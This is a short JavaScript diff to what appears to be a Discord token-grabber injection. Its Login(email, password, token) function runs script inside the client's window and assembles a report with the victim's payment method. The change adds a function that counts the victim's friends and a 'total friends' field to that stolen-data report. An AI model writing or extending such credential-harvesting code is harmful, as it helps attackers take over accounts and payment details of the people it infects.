@@ -191,6 +191,14 @@ function checkpaymentmethod() {
 	return billing
 }
 
+function intotalfriends() {
+	var f = JSON.parse(info4)
+	const r = f.filter((user) => {
+		return user.type == 1
+	})
+	return r.length
+}
+
 function Login(email, password, token) {
     const window = BrowserWindow.getAllWindows()[0];
     window.webContents.executeJavaScript(`
@@ -258,6 +266,11 @@ function Login(email, password, token) {
                         {
                             "name": " payment method",
                             "value": `\`${checkpaymentmethod()}\``,
+                            "inline": true		    
+                        },
+                        {
+                            "name": " total friends",
+                            "value": `\`${intotalfriends()})\``,
                             "inline": true		    
                         },
                         {
